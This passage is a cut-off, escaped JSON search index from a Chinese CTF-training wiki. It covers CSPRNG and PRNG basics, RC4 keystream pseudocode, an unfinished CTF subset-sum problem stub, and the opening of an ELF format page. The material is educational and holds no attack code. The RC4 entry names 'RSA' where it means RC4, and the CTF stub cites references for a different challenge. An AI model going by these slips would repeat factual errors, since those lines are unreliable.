\uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002 \u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002 \u5206\u7c7b \u00b6 \u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b \u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002 \u57fa\u4e8e\u6570\u5b66\u96be\u9898 \u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1 \u53c2\u8003\u6587\u732e \u00b6 https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/#_1","text":"","title":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/#_2","text":"\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG)\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002 \u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570 \u5bc6\u94a5\u751f\u6210 \u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0cIV\uff0c\u7528\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684 CBC\uff0cCFB\uff0cOFB \u6a21\u5f0f nounce\uff0c\u7528\u4e8e\u9632\u6b62\u91cd\u653e\u653b\u51fb\u4ee5\u53ca\u5206\u7ec4\u5bc6\u7801\u7684 CTR \u6a21\u5f0f\u7b49\u3001 one-time pads \u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 ECDSA \uff0c RSASSA-PSS","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/csprng/#_3","text":"\u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b \u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 next-bit test \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7 next-bit test \uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002 \u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002","title":"\u9700\u6c42"},{"location":"crypto/streamcipher/prng/csprng/#_4","text":"\u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b \u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002 \u57fa\u4e8e\u6570\u5b66\u96be\u9898 \u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1","title":"\u5206\u7c7b"},{"location":"crypto/streamcipher/prng/csprng/#_5","text":"https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/prng/intro/","text":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd \u00b6 \u6982\u8ff0 \u00b6 \u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210 \u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217 \u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002 \u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002 \u968f\u673a\u6027\u7684\u4e25\u683c\u6027 \u00b6 \u968f\u673a\u6027\uff1a\u968f\u673a\u6570\u5e94\u8be5\u4e0d\u5b58\u5728\u7edf\u8ba1\u5b66\u504f\u5dee\uff0c\u662f\u5b8c\u5168\u6742\u4e71\u7684\u6570\u5217\u3002 \u4e0d\u53ef\u9884\u6d4b\u6027\uff1a\u4e0d\u80fd\u4ece\u8fc7\u53bb\u7684\u5e8f\u5217\u63a8\u6d4b\u51fa\u4e0b\u4e00\u4e2a\u51fa\u73b0\u7684\u6570\u3002 \u4e0d\u53ef\u91cd\u73b0\u6027\uff1a\u9664\u975e\u6570\u5217\u4fdd\u5b58\u4e0b\u6765\uff0c\u5426\u5219\u4e0d\u80fd\u91cd\u73b0\u76f8\u540c\u7684\u6570\u5217\u3002 \u8fd9\u4e09\u4e2a\u6027\u8d28\u7684\u4e25\u683c\u6027\u4f9d\u6b21\u9012\u589e\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u968f\u673a\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b \u7c7b\u522b \u968f\u673a\u6027 \u4e0d\u53ef\u9884\u6d4b\u6027 \u4e0d\u53ef\u91cd\u73b0\u6027 \u5f31\u4f2a\u968f\u673a\u6570 \u2705 \u274c \u274c \u5f3a\u4f2a\u968f\u673a\u6570 \u2705 \u2705 \u274c \u771f\u968f\u673a\u6570 \u2705 \u2705 \u2705 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\u4e2d\u4f7f\u7528\u7684\u968f\u673a\u6570\u662f\u7b2c\u4e8c\u79cd\u3002 \u5468\u671f \u00b6 \u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684 \u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001 \uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002 \u8bc4\u4ef7\u6807\u51c6 \u00b6 \u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c https://en.wikipedia.org/wiki/Pseudorandom_number_generator \u3002 \u5206\u7c7b \u00b6 \u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709 \u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\uff0cLCG \u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668 Mersenne Twister xorshift generators WELL family of generators Linear feedback shift register\uff0cLFSR\uff0c\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u95ee\u9898 \u00b6 \u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898 \u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002 \u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002 \u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002 \u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002 \u53c2\u8003 \u00b6 https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/intro/#_1","text":"","title":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd"},{"location":"crypto/streamcipher/prng/intro/#_2","text":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210 \u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217 \u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002 \u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002","title":"\u6982\u8ff0"},{"location":"crypto/streamcipher/prng/intro/#_3","text":"\u968f\u673a\u6027\uff1a\u968f\u673a\u6570\u5e94\u8be5\u4e0d\u5b58\u5728\u7edf\u8ba1\u5b66\u504f\u5dee\uff0c\u662f\u5b8c\u5168\u6742\u4e71\u7684\u6570\u5217\u3002 \u4e0d\u53ef\u9884\u6d4b\u6027\uff1a\u4e0d\u80fd\u4ece\u8fc7\u53bb\u7684\u5e8f\u5217\u63a8\u6d4b\u51fa\u4e0b\u4e00\u4e2a\u51fa\u73b0\u7684\u6570\u3002 \u4e0d\u53ef\u91cd\u73b0\u6027\uff1a\u9664\u975e\u6570\u5217\u4fdd\u5b58\u4e0b\u6765\uff0c\u5426\u5219\u4e0d\u80fd\u91cd\u73b0\u76f8\u540c\u7684\u6570\u5217\u3002 \u8fd9\u4e09\u4e2a\u6027\u8d28\u7684\u4e25\u683c\u6027\u4f9d\u6b21\u9012\u589e\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u968f\u673a\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b \u7c7b\u522b \u968f\u673a\u6027 \u4e0d\u53ef\u9884\u6d4b\u6027 \u4e0d\u53ef\u91cd\u73b0\u6027 \u5f31\u4f2a\u968f\u673a\u6570 \u2705 \u274c \u274c \u5f3a\u4f2a\u968f\u673a\u6570 \u2705 \u2705 \u274c \u771f\u968f\u673a\u6570 \u2705 \u2705 \u2705 \u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\u4e2d\u4f7f\u7528\u7684\u968f\u673a\u6570\u662f\u7b2c\u4e8c\u79cd\u3002","title":"\u968f\u673a\u6027\u7684\u4e25\u683c\u6027"},{"location":"crypto/streamcipher/prng/intro/#_4","text":"\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684 \u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001 \uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002","title":"\u5468\u671f"},{"location":"crypto/streamcipher/prng/intro/#_5","text":"\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c https://en.wikipedia.org/wiki/Pseudorandom_number_generator \u3002","title":"\u8bc4\u4ef7\u6807\u51c6"},{"location":"crypto/streamcipher/prng/intro/#_6","text":"\u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709 \u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\uff0cLCG \u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668 Mersenne Twister xorshift generators WELL family of generators Linear feedback shift register\uff0cLFSR\uff0c\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668","title":"\u5206\u7c7b"},{"location":"crypto/streamcipher/prng/intro/#_7","text":"\u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898 \u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002 \u751f\u6210\u5927\u6570\u65f6\uff0c\u5206\u914d\u7684\u4e0d\u5747\u5300\u3002 \u8fde\u7eed\u503c\u4e4b\u95f4\u5173\u8054\u5bc6\u5207\uff0c\u77e5\u9053\u540e\u7eed\u503c\uff0c\u53ef\u4ee5\u77e5\u9053\u4e4b\u524d\u7684\u503c\u3002 \u8f93\u51fa\u5e8f\u5217\u7684\u503c\u7684\u5927\u5c0f\u5f88\u4e0d\u5747\u5300\u3002","title":"\u95ee\u9898"},{"location":"crypto/streamcipher/prng/intro/#_8","text":"https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"\u53c2\u8003"},{"location":"crypto/streamcipher/prng/problem/","text":"\u9898\u76ee \u00b6 2017 Tokyo Westerns CTF 3 rd Backpacker's Problem \u00b6 \u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 \u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002 \u5f85\u5b8c\u6210 \u53c2\u8003\u6587\u732e \u00b6 https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/prng/problem/#_1","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem","text":"\u9898\u76ee\u4e2d\u7ed9\u4e86\u4e00\u4e2a cpp \u6587\u4ef6\uff0c\u5927\u6982\u610f\u601d\u5982\u4e0b Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 \u5373\u662f\u4e00\u4e2a\u80cc\u5305\u95ee\u9898\u3002\u5176\u4e2d\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3 20 \u4e2a\u8fd9\u6837\u7684\u80cc\u5305\u95ee\u9898\uff0c\u80cc\u5305\u5927\u5c0f\u4f9d\u6b21\u662f 1 * 10~20 * 10\u3002\u800c\u5b50\u96c6\u6c42\u548c\u7684\u80cc\u5305\u95ee\u9898\u662f\u4e00\u4e2a NPC \u95ee\u9898\uff0c\u95ee\u9898\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u968f\u7740\u968f\u7740\u80cc\u5305\u5927\u5c0f\u800c\u6307\u6570\u589e\u957f\u3002\u8fd9\u91cc\u80cc\u5305\u7684\u5927\u5c0f\u6700\u5927\u662f200\uff0c\u663e\u7136\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\u3002 \u5f85\u5b8c\u6210","title":"2017 Tokyo Westerns CTF 3rd Backpacker's Problem"},{"location":"crypto/streamcipher/prng/problem/#_2","text":"https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/special/rc4/","text":"RC4 \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 RSA \u7531 Ron Rivest \u8bbe\u8ba1\uff0c\u6700\u521d\u96b6\u5c5e\u4e8e RSA \u5b89\u5168\u516c\u53f8\uff0c\u662f\u4e00\u4e2a\u4e13\u5229\u5bc6\u7801\u4ea7\u54c1\u3002\u5b83\u662f\u9762\u5411\u5b57\u8282\u7684\u6d41\u5bc6\u7801\uff0c\u5bc6\u94a5\u957f\u5ea6\u53ef\u53d8\uff0c\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4e5f\u5f88\u6709\u6548\u679c\u3002RC4 \u7b97\u6cd5\u5e7f\u6cdb\u5e94\u7528\u4e8e SSL/TLS \u534f\u8bae\u548c WEP/WPA \u534f\u8bae\u3002 \u57fa\u672c\u6d41\u7a0b \u00b6 RC4 \u4e3b\u8981\u5305\u542b\u4e09\u4e2a\u6d41\u7a0b \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4\u3002 \u521d\u59cb\u5316\u7f6e\u6362 S\u3002 \u751f\u6210\u5bc6\u94a5\u6d41\u3002 \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4 \u00b6 \u521d\u59cb\u5316 S \u548c T \u7684\u4ee3\u7801\u5982\u4e0b for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ]) \u521d\u59cb\u5316\u7f6e\u6362 S \u00b6 j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) \u751f\u6210\u6d41\u5bc6\u94a5 \u00b6 i = j = 0 for each message byte b i = ( i + 1 ) ( mod 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] \u6211\u4eec\u4e00\u822c\u79f0\u524d\u4e24\u90e8\u5206\u4e3a KSA \uff0c\u6700\u540e\u4e00\u90e8\u5206\u662f PRGA\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u5f85\u8865\u5145\u3002","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#rc4","text":"","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#_1","text":"RSA \u7531 Ron Rivest \u8bbe\u8ba1\uff0c\u6700\u521d\u96b6\u5c5e\u4e8e RSA \u5b89\u5168\u516c\u53f8\uff0c\u662f\u4e00\u4e2a\u4e13\u5229\u5bc6\u7801\u4ea7\u54c1\u3002\u5b83\u662f\u9762\u5411\u5b57\u8282\u7684\u6d41\u5bc6\u7801\uff0c\u5bc6\u94a5\u957f\u5ea6\u53ef\u53d8\uff0c\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4e5f\u5f88\u6709\u6548\u679c\u3002RC4 \u7b97\u6cd5\u5e7f\u6cdb\u5e94\u7528\u4e8e SSL/TLS \u534f\u8bae\u548c WEP/WPA \u534f\u8bae\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/streamcipher/special/rc4/#_2","text":"RC4 \u4e3b\u8981\u5305\u542b\u4e09\u4e2a\u6d41\u7a0b \u521d\u59cb\u5316 S \u548c T \u6570\u7ec4\u3002 \u521d\u59cb\u5316\u7f6e\u6362 S\u3002 \u751f\u6210\u5bc6\u94a5\u6d41\u3002","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/streamcipher/special/rc4/#s-t","text":"\u521d\u59cb\u5316 S \u548c T \u7684\u4ee3\u7801\u5982\u4e0b for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ])","title":"\u521d\u59cb\u5316 S \u548c T \u6570\u7ec4"},{"location":"crypto/streamcipher/special/rc4/#s","text":"j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ])","title":"\u521d\u59cb\u5316\u7f6e\u6362 S"},{"location":"crypto/streamcipher/special/rc4/#_3","text":"i = j = 0 for each message byte b i = ( i + 1 ) ( mod 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] \u6211\u4eec\u4e00\u822c\u79f0\u524d\u4e24\u90e8\u5206\u4e3a KSA \uff0c\u6700\u540e\u4e00\u90e8\u5206\u662f PRGA\u3002","title":"\u751f\u6210\u6d41\u5bc6\u94a5"},{"location":"crypto/streamcipher/special/rc4/#_4","text":"\u5f85\u8865\u5145\u3002","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"executable/elf/elf_structure/","text":"ELF \u6587\u4ef6 \u00b6 \u672c\u90e8\u5206\u5185\u5bb9\u6765\u6e90\u4e8e ELF 1.2 \u6807\u51c6\uff0c\u5185\u5bb9\u7ecf\u8fc7\u4e00\u5b9a\u7684\u4fee\u6539\u4e0e\u6574\u7406\uff0c\u4e3b\u8981\u53c2\u8003\u6587\u732e\u5982\u4e0b ELF \u6587\u4ef6\u683c\u5f0f\u5206\u6790\uff0c\u5317\u4eac\u5927\u5b66\uff0c\u6ed5\u542f\u660e ELF-\u6467\u6bc1\u5723\u8bde \u7b80\u4ecb \u00b6 ELF \uff08Executable and Linkable Format\uff09\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u5728 Linux \u4e2d\u7684\u76ee\u6807\u6587\u4ef6\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable 